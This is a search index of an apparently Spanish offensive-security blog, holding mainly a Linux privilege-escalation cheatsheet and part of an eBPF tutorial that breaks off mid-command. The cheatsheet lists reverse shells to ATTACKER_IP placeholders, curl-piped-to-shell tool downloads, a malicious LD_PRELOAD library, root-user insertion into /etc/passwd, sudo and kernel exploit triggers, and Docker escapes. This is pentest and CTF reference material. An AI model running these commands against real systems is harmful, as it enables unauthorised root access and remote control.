{"config":{"lang":["es"],"separator":"[\\s\\-\\.]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"RAZOR <p>OFFENSIVE SECURITY RESEARCH</p> cat /etc/shadow | grep root 0 Writeups 0 Cheatsheets 0 Research 0 Active"},{"location":"#ultimos-posts","title":"// \u00daltimos Posts","text":"kernel Introducci\u00f3n a eBPF <p>Extended Berkeley Packet Filter: hooking del kernel moderno para observabilidad y seguridad.</p> 2025-01-09 \u23f1\ufe0f 15 min privesc Linux Privilege Escalation <p>T\u00e9cnicas de escalada de privilegios en sistemas Linux: SUID, capabilities, kernel exploits y m\u00e1s.</p> 2025-01-08 \u23f1\ufe0f 20 min malware Shellcode Basics <p>Fundamentos de desarrollo de shellcode: syscalls, position-independent code y evasi\u00f3n.</p> 2025-01-07 \u23f1\ufe0f 25 min"},{"location":"#secciones","title":"// Secciones","text":"\ud83d\udcc1 Writeups <p>Resoluci\u00f3n paso a paso de m\u00e1quinas CTF, HackTheBox, TryHackMe y competiciones.</p> \ud83d\udccb Cheatsheets <p>Referencias r\u00e1pidas y comandos \u00fatiles para pentesting, reversing y red team.</p> \ud83d\udd2c Research <p>Investigaci\u00f3n en desarrollo de malware, explotaci\u00f3n de kernel y t\u00e9cnicas avanzadas.</p>"},{"location":"#quick-access","title":"// Quick Access","text":"Bash<pre><code># Whoami\n$ id\nuid=1337(0x574R) gid=1337(razor) groups=1337(razor),27(sudo)\n\n# Focus Areas\n$ cat /proc/interests\n- Kernel Exploitation\n- Malware Development  \n- eBPF Security\n- x86-64 Assembly\n- Linux Internals\n\n# Contact\n$ curl -s https://github.com/0x574R\n</code></pre> <p>     [ Built with MkDocs Material | Hosted on GitHub Pages ]   </p>"},{"location":"tags/","title":"Tags","text":"<p>Todos los posts organizados por etiquetas.</p>"},{"location":"tags/#tag:assembly","title":"assembly","text":"<ul> <li>            Shellcode Basics          </li> </ul>"},{"location":"tags/#tag:ebpf","title":"ebpf","text":"<ul> <li>            Introducci\u00f3n a eBPF          </li> </ul>"},{"location":"tags/#tag:enumeration","title":"enumeration","text":"<ul> <li>            Linux Privilege Escalation          </li> </ul>"},{"location":"tags/#tag:kernel","title":"kernel","text":"<ul> <li>            Introducci\u00f3n a eBPF          </li> </ul>"},{"location":"tags/#tag:linux","title":"linux","text":"<ul> <li>            Introducci\u00f3n a eBPF          </li> <li>            Linux Privilege Escalation          </li> <li>            Shellcode Basics          </li> </ul>"},{"location":"tags/#tag:privesc","title":"privesc","text":"<ul> <li>            Linux Privilege Escalation          </li> </ul>"},{"location":"tags/#tag:shellcode","title":"shellcode","text":"<ul> <li>            Shellcode Basics          </li> </ul>"},{"location":"cheatsheets/","title":"\ud83d\udccb Cheatsheets","text":"<p>Referencias r\u00e1pidas, comandos y t\u00e9cnicas para tener siempre a mano.</p>"},{"location":"cheatsheets/#disponibles","title":"// Disponibles","text":"linux Linux Privilege Escalation <p>SUID, capabilities, cron jobs, kernel exploits, sudo bypass y m\u00e1s t\u00e9cnicas de privesc.</p> Actualizado: 2025-01-08"},{"location":"cheatsheets/#proximamente","title":"// Pr\u00f3ximamente","text":"windows Windows Privilege Escalation <p>Token impersonation, SeImpersonate, unquoted paths, DLL hijacking.</p> web Web Application Testing <p>OWASP Top 10, SQLi, XSS, SSRF, authentication bypass.</p> network Network Enumeration <p>Nmap, masscan, DNS enum, SMB, LDAP, Kerberos.</p> ad Active Directory <p>BloodHound, Kerberoasting, Pass-the-Hash, Golden Ticket.</p> reverse Reverse Engineering <p>GDB, Ghidra, IDA, radare2, an\u00e1lisis de binarios.</p> tools Tool Reference <p>Metasploit, Burp Suite, sqlmap, hashcat, impacket.</p>"},{"location":"cheatsheets/#quick-commands","title":"// Quick Commands","text":"Bash<pre><code># Reverse Shell - Bash\nbash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1\n\n# Reverse Shell - Python\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n# Find SUID binaries\nfind / -perm -4000 -type f 2&gt;/dev/null\n\n# LinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n</code></pre> <p>Contribuciones</p> <p>\u00bfTienes comandos o t\u00e9cnicas \u00fatiles? Abre un issue en el repositorio.</p>"},{"location":"cheatsheets/linux-privesc/","title":"Linux Privilege Escalation","text":"<p>Gu\u00eda completa de t\u00e9cnicas de escalada de privilegios en sistemas Linux.</p>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#enumeration","title":"// Enumeration","text":"","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#system-information","title":"System Information","text":"Bash<pre><code># Kernel version\nuname -a\ncat /proc/version\ncat /etc/issue\n\n# Architecture\narch\n\n# Hostname\nhostname\n\n# Environment variables\nenv\ncat /etc/profile\ncat ~/.bashrc\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#users-groups","title":"Users &amp; Groups","text":"Bash<pre><code># Current user\nid\nwhoami\n\n# All users\ncat /etc/passwd\ncat /etc/shadow  # if readable\n\n# Groups\ncat /etc/group\n\n# Sudo permissions\nsudo -l\n\n# Users with bash\ngrep -E '/bin/(ba)?sh' /etc/passwd\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#network","title":"Network","text":"Bash<pre><code># Network interfaces\nip a\nifconfig\n\n# Routing\nip route\nroute -n\n\n# Open ports\nss -tulpn\nnetstat -tulpn\n\n# Connections\nss -anp\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#suidsgid-binaries","title":"// SUID/SGID Binaries","text":"","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#find-suid-binaries","title":"Find SUID Binaries","text":"Bash<pre><code>find / -perm -4000 -type f 2&gt;/dev/null\nfind / -perm -u=s -type f 2&gt;/dev/null\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#find-sgid-binaries","title":"Find SGID Binaries","text":"Bash<pre><code>find / -perm -2000 -type f 2&gt;/dev/null\nfind / -perm -g=s -type f 2&gt;/dev/null\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#gtfobins-check","title":"GTFOBins Check","text":"Bash<pre><code># Common exploitable SUID binaries\n# Check: https://gtfobins.github.io/\n\n# Examples:\n/usr/bin/find . -exec /bin/sh -p \\; -quit\n/usr/bin/vim -c ':!/bin/sh'\n/usr/bin/nmap --interactive  # older versions\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#capabilities","title":"// Capabilities","text":"","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#find-capabilities","title":"Find Capabilities","text":"Bash<pre><code>getcap -r / 2&gt;/dev/null\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#exploitable-capabilities","title":"Exploitable Capabilities","text":"Bash<pre><code># CAP_SETUID - Python\n/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n\n# CAP_SETUID - Perl\n/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'\n\n# CAP_DAC_READ_SEARCH - tar\n/usr/bin/tar -cvf shadow.tar /etc/shadow\ntar -xvf shadow.tar\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#sudo-exploitation","title":"// Sudo Exploitation","text":"","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#check-sudo-permissions","title":"Check Sudo Permissions","text":"Bash<pre><code>sudo -l\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#common-sudo-exploits","title":"Common Sudo Exploits","text":"Bash<pre><code># LD_PRELOAD (if env_keep+=LD_PRELOAD)\n# 1. Create malicious shared object\necho '#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}' &gt; /tmp/shell.c\ngcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles\n\n# 2. Execute\nsudo LD_PRELOAD=/tmp/shell.so &lt;allowed_command&gt;\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#sudo-version-exploits","title":"Sudo Version Exploits","text":"Bash<pre><code># Check version\nsudo -V\n\n# CVE-2021-3156 (Sudo Baron Samedit)\n# Versions: 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1\nsudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#cron-jobs","title":"// Cron Jobs","text":"","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#enumerate-cron","title":"Enumerate Cron","text":"Bash<pre><code># System cron\ncat /etc/crontab\nls -la /etc/cron.*\n\n# User cron\ncrontab -l\nls -la /var/spool/cron/crontabs/\n\n# Running processes\npspy64  # Tool for process snooping\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#exploit-writable-scripts","title":"Exploit Writable Scripts","text":"Bash<pre><code># If cron runs a script you can write to:\necho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt;&gt; /path/to/script.sh\n\n# After cron executes:\n/tmp/bash -p\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#path-injection","title":"PATH Injection","text":"Bash<pre><code># If cron uses relative paths and PATH is controllable\necho '/bin/bash -i &gt;&amp; /dev/tcp/ATTACKER/PORT 0&gt;&amp;1' &gt; /tmp/vulnerable_binary\nchmod +x /tmp/vulnerable_binary\nexport PATH=/tmp:$PATH\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#writable-files","title":"// Writable Files","text":"","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#find-writable-directories","title":"Find Writable Directories","text":"Bash<pre><code>find / -writable -type d 2&gt;/dev/null\nfind / -perm -222 -type d 2&gt;/dev/null\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#find-writable-files","title":"Find Writable Files","text":"Bash<pre><code>find / -writable -type f 2&gt;/dev/null\n\n# Writable /etc/passwd\necho 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd\nsu hacker  # password: password\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#world-writable-etcshadow","title":"World-Writable /etc/shadow","text":"Bash<pre><code># Generate password hash\nopenssl passwd -1 newpassword\n\n# Replace root hash\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#kernel-exploits","title":"// Kernel Exploits","text":"","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#check-kernel-version","title":"Check Kernel Version","text":"Bash<pre><code>uname -r\ncat /proc/version\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#common-kernel-exploits","title":"Common Kernel Exploits","text":"Kernel Version CVE Exploit 2.6.22 &lt; 3.9 CVE-2016-5195 DirtyCow 4.4.0-116 CVE-2017-16995 eBPF_verifier 5.8 &lt; 5.16.11 CVE-2022-0847 DirtyPipe &lt; 5.11 CVE-2021-22555 Netfilter","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#dirtypipe-cve-2022-0847","title":"DirtyPipe (CVE-2022-0847)","text":"Bash<pre><code># Check if vulnerable\nuname -r  # 5.8 &lt;= version &lt; 5.16.11\n\n# Compile and run exploit\ngcc -o dirtypipe dirtypipe.c\n./dirtypipe /etc/passwd 1 \"${OVERWRITE}\"\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#docker-escape","title":"// Docker Escape","text":"","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#check-if-in-container","title":"Check if in Container","text":"Bash<pre><code>cat /proc/1/cgroup\nls -la /.dockerenv\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#privileged-container","title":"Privileged Container","text":"Bash<pre><code># If --privileged flag was used\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\nchroot /mnt/host\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#docker-socket","title":"Docker Socket","text":"Bash<pre><code># If /var/run/docker.sock is accessible\ndocker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#automated-enumeration","title":"// Automated Enumeration","text":"","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#linpeas","title":"LinPEAS","text":"Bash<pre><code># Download and run\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Or transfer\nwget http://ATTACKER:8000/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#linenum","title":"LinEnum","text":"Bash<pre><code>wget http://ATTACKER:8000/LinEnum.sh\nchmod +x LinEnum.sh\n./LinEnum.sh -t\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#linux-exploit-suggester","title":"linux-exploit-suggester","text":"Bash<pre><code>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\nchmod +x linux-exploit-suggester.sh\n./linux-exploit-suggester.sh\n</code></pre>","tags":["linux","privesc","enumeration"]},{"location":"cheatsheets/linux-privesc/#quick-reference","title":"// Quick Reference","text":"<p>Checklist</p> <ol> <li> <code>sudo -l</code> - Check sudo permissions</li> <li> SUID/SGID binaries</li> <li> Capabilities</li> <li> Cron jobs</li> <li> Writable files (/etc/passwd, /etc/shadow)</li> <li> Kernel version \u2192 known exploits</li> <li> Running services as root</li> <li> Docker/LXC escape</li> <li> NFS shares (no_root_squash)</li> <li> Passwords in files/history</li> </ol> <p>Resources</p> <ul> <li>GTFOBins</li> <li>HackTricks - Linux Privesc</li> <li>PayloadsAllTheThings</li> </ul>","tags":["linux","privesc","enumeration"]},{"location":"research/","title":"\ud83d\udd2c Research","text":"<p>Investigaci\u00f3n t\u00e9cnica en \u00e1reas avanzadas de seguridad ofensiva.</p>"},{"location":"research/#areas-de-investigacion","title":"// \u00c1reas de Investigaci\u00f3n","text":"kernel Kernel Security <p>Linux kernel internals, eBPF, rootkits, kernel exploitation y t\u00e9cnicas de evasi\u00f3n a nivel de kernel.</p> Art\u00edculos: 1 malware Malware Development <p>Desarrollo de malware educativo: shellcode, loaders, evasi\u00f3n de AV/EDR, t\u00e9cnicas de persistencia.</p> Art\u00edculos: 1"},{"location":"research/#ultimos-articulos","title":"// \u00daltimos Art\u00edculos","text":"Fecha Categor\u00eda T\u00edtulo 2025-01-09 Kernel Introducci\u00f3n a eBPF 2025-01-07 Malware Shellcode Basics"},{"location":"research/#focus-areas","title":"// Focus Areas","text":"Text Only<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  RESEARCH FOCUS                                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                          \u2502\n\u2502  \u25b8 Linux Kernel Exploitation                            \u2502\n\u2502  \u25b8 eBPF Security &amp; Offensive Uses                       \u2502\n\u2502  \u25b8 Rootkit Development &amp; Detection                      \u2502\n\u2502  \u25b8 Position-Independent Shellcode                       \u2502\n\u2502  \u25b8 AV/EDR Evasion Techniques                           \u2502\n\u2502  \u25b8 x86-64 Assembly Programming                          \u2502\n\u2502  \u25b8 Memory Forensics &amp; Anti-Forensics                   \u2502\n\u2502                                                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Disclaimer</p> <p>Todo el contenido de esta secci\u00f3n es con fines educativos y de investigaci\u00f3n.  El uso indebido de esta informaci\u00f3n es responsabilidad exclusiva del lector.</p>"},{"location":"research/kernel/","title":"Kernel Security","text":"<p>Investigaci\u00f3n en seguridad del kernel de Linux: internals, eBPF, rootkits y explotaci\u00f3n.</p>"},{"location":"research/kernel/#articulos","title":"// Art\u00edculos","text":"ebpf Introducci\u00f3n a eBPF <p>Extended Berkeley Packet Filter: hooking del kernel moderno para observabilidad y seguridad ofensiva.</p> 2025-01-09 \u23f1\ufe0f 15 min"},{"location":"research/kernel/#proximamente","title":"// Pr\u00f3ximamente","text":"<ul> <li> Linux Kernel Exploitation 101</li> <li> Writing a Simple Rootkit</li> <li> Syscall Hooking Techniques</li> <li> Bypassing KASLR</li> <li> SMEP/SMAP Bypass Methods</li> <li> Return-Oriented Programming in Kernel</li> </ul>"},{"location":"research/kernel/#resources","title":"// Resources","text":"<p>Referencias</p> <ul> <li>Linux Kernel Documentation</li> <li>eBPF.io</li> <li>Kernel Exploitation by KSPP</li> </ul>"},{"location":"research/kernel/ebpf-intro/","title":"Introducci\u00f3n a eBPF","text":"<p>eBPF (extended Berkeley Packet Filter) es una tecnolog\u00eda revolucionaria que permite ejecutar programas sandboxed en el kernel de Linux sin modificar el c\u00f3digo fuente del kernel ni cargar m\u00f3dulos.</p>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#que-es-ebpf","title":"// \u00bfQu\u00e9 es eBPF?","text":"<p>eBPF act\u00faa como una m\u00e1quina virtual dentro del kernel que puede ejecutar c\u00f3digo de forma segura y eficiente. Originalmente dise\u00f1ado para filtrado de paquetes, ahora se usa para:</p> <ul> <li>Observabilidad: Tracing, profiling, monitorizaci\u00f3n</li> <li>Networking: Load balancing, firewalls, packet processing</li> <li>Seguridad: Sandboxing, detecci\u00f3n de intrusiones</li> <li>Offensive: Rootkits, evasi\u00f3n, manipulaci\u00f3n de syscalls</li> </ul> Text Only<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                     USER SPACE                          \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n\u2502  \u2502 Application \u2502  \u2502    bpftool  \u2502  \u2502  libbpf     \u2502     \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502         \u2502                \u2502                \u2502             \u2502\n\u2502         \u25bc                \u25bc                \u25bc             \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2502\n\u2502  \u2502              BPF SYSCALL INTERFACE            \u2502      \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502\n\u2502                          \u2502                              \u2502\n\u2502                          \u25bc                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2502\n\u2502  \u2502               BPF VERIFIER                    \u2502      \u2502\n\u2502  \u2502    (Safety checks, bounds checking)           \u2502      \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502\n\u2502                          \u2502                              \u2502\n\u2502                          \u25bc                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2502\n\u2502  \u2502              JIT COMPILER                     \u2502      \u2502\n\u2502  \u2502    (Convert BPF bytecode to native code)      \u2502      \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502\n\u2502                          \u2502                              \u2502\n\u2502                          \u25bc                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u2502\n\u2502  \u2502 kprobes \u2502 \u2502 uprobes \u2502 \u2502tracepoints\u2502 \u2502 XDP   \u2502       \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2502\n\u2502                     KERNEL SPACE                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#hook-points","title":"// Hook Points","text":"<p>eBPF puede attacharse a diferentes puntos del kernel:</p>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#kprobes-kretprobes","title":"Kprobes / Kretprobes","text":"<p>Permiten interceptar cualquier funci\u00f3n del kernel.</p> C<pre><code>SEC(\"kprobe/sys_execve\")\nint trace_execve(struct pt_regs *ctx)\n{\n    // Log every execve call\n    char comm[16];\n    bpf_get_current_comm(&amp;comm, sizeof(comm));\n    bpf_printk(\"execve by: %s\\n\", comm);\n    return 0;\n}\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#tracepoints","title":"Tracepoints","text":"<p>Puntos de instrumentaci\u00f3n estables definidos en el kernel.</p> C<pre><code>SEC(\"tracepoint/syscalls/sys_enter_openat\")\nint trace_openat(struct trace_event_raw_sys_enter *ctx)\n{\n    char filename[256];\n    bpf_probe_read_user_str(filename, sizeof(filename), \n                            (void *)ctx-&gt;args[1]);\n    bpf_printk(\"openat: %s\\n\", filename);\n    return 0;\n}\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#xdp-express-data-path","title":"XDP (eXpress Data Path)","text":"<p>Procesamiento de paquetes a muy bajo nivel, antes incluso del stack de red.</p> C<pre><code>SEC(\"xdp\")\nint xdp_filter(struct xdp_md *ctx)\n{\n    void *data_end = (void *)(long)ctx-&gt;data_end;\n    void *data = (void *)(long)ctx-&gt;data;\n\n    struct ethhdr *eth = data;\n    if ((void *)eth + sizeof(*eth) &gt; data_end)\n        return XDP_PASS;\n\n    // Drop all non-IP packets\n    if (eth-&gt;h_proto != htons(ETH_P_IP))\n        return XDP_DROP;\n\n    return XDP_PASS;\n}\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#estructura-de-un-programa-ebpf","title":"// Estructura de un Programa eBPF","text":"","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#componentes-basicos","title":"Componentes B\u00e1sicos","text":"C<pre><code>// 1. Headers\n#include &lt;linux/bpf.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n\n// 2. Maps (para compartir datos)\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 1024);\n    __type(key, __u32);\n    __type(value, __u64);\n} my_map SEC(\".maps\");\n\n// 3. Programa BPF\nSEC(\"kprobe/__x64_sys_write\")\nint BPF_KPROBE(trace_write, int fd, const void *buf, size_t count)\n{\n    __u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    __u64 *value = bpf_map_lookup_elem(&amp;my_map, &amp;pid);\n\n    if (value)\n        __sync_fetch_and_add(value, count);\n    else {\n        __u64 init = count;\n        bpf_map_update_elem(&amp;my_map, &amp;pid, &amp;init, BPF_ANY);\n    }\n\n    return 0;\n}\n\n// 4. License (requerida)\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre>","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#compilacion-y-carga","title":"// Compilaci\u00f3n y Carga","text":"","tags":["kernel","ebpf","linux"]},{"location":"research/kernel/ebpf-intro/#compilar-con-clang","title":"Compilar con clang","text":"Bash<pre><code>clang -O2 -target bpf -c program.bpf.c -o program.bpf.o\n\n# Con BTF (mejor compatibilidad)\nclang -O2 -g -target bpf \\\n    -D__TARGET_ARCH_x86 \\\n    -c program.bpf.c -o 